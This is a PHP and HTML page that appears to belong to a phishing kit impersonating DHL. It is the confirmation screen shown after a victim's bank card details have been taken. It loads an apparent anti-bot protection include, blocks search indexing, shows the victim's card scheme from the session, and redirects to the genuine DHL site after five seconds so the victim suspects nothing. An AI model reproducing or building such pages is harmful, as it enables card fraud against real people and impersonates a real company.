<?php
session_start();
include("Variablex/Protection.php");
include("Variablex/SYS.php");
include("dynamo.php");
?>
<!doctype html>
<html lang="ar">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
    <meta http-equiv="refresh" content="5; URL=https://www.DHL.com" />

    <!-- CSS FILES -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="Assistant/favicon.ico">

    <title>DHL</title>

    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f8f9fa;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .modal-dialog {
            max-width: 600px;
            margin: auto;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .modal-header {
            background-color: #ffcc00;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .modal-header img {
            max-height: 50px;
        }
        .modal-body {
            padding: 30px;
            text-align: center;
        }
        .modal-body img {
            max-width: 150px;
            margin-bottom: 20px;
        }
        .modal-body h4 {
            color: green;
            margin-bottom: 20px;
            font-size: 1.5rem;
        }
        .modal-body p {
            font-size: 1rem;
            color: #555;
        }
        .copirayt p {
            font-size: 0.875rem;
            color: #777;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <div class="modal-dialog shadow">
        <div class="modal-content">
            <div class="modal-header">
                <img src="Assistant/dhl-logo.svg" alt="DHL Logo">
                <img src="Assistant/<?php echo $_SESSION['bank_scheme']; ?>.png" class="sfli" alt="Bank Scheme">
            </div>
            <div class="modal-body pt-3">
                <div class="text-center">
                    <img src="Assistant/valid.gif" alt="Validation">
                </div>
                <div class="text-center px-3 py-3">
                    <h4><?php echo get_text("thanks_2"); ?></h4>
                    <p><?php echo get_text("thanks"); ?></p>
                </div>
                <div class="copirayt text-center">
                    <p><?php echo get_text("copyright"); ?></p>
                </div>
            </div>
        </div>
    </div>

    <!-- JS FILES -->
    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
</body>

</html>
